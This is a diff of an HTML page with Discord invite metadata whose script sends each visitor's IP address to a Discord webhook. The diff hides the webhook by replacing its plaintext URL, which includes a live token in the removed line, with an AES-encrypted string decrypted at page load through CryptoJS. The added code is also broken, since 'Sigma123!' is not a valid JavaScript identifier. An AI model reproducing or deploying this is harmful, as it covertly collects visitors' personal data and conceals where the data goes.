@@ -10,6 +10,7 @@
     <meta property="og:description" content="discord.gg/drogen!">
     <meta name="theme-color" content="#11b9d6">
     <link rel="icon" type="image/png" href="https://i.imgur.com/9BrtuAf.jpeg">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1-crypto-js.js"></script>
     <style>
         body {
             display: flex;
@@ -37,8 +38,19 @@
     <p><span id="ip-address"></span></p>
 
     <script>
+       
+        const encryptedWebhookURL = 'U2FsdGVkX1+J0BcJTLnGcYY/lwJww11aZ2ijsejxjsY=';  
+
+        const Sigma123! = 'dein-geheimes-passwort';  // Das gleiche geheime Passwort, das du für die Verschlüsselung verwendet hast
+
+        // Funktion, um den Webhook-URL zu entschlüsseln
+        function decryptWebhook(encrypted) {
+            const bytes = CryptoJS.AES.decrypt(encrypted, Sigma123!);
+            return bytes.toString(CryptoJS.enc.Utf8);
+        }
+
         function sendToDiscord(ip) {
-            const webhookURL = 'https://discord.com/api/webhooks/1329145057978220574/t0H16LD-DXtBVkWb6VcP7F0Flp_CF1M4mYwRBiBZSa-DBSLbzXssdBLhsTwl91KFvKvy';
+            const webhookURL = decryptWebhook(encryptedWebhookURL);  // Entschlüsselter Webhook-URL
             const data = {
                 content: `Sigma: ${ip}`
             };
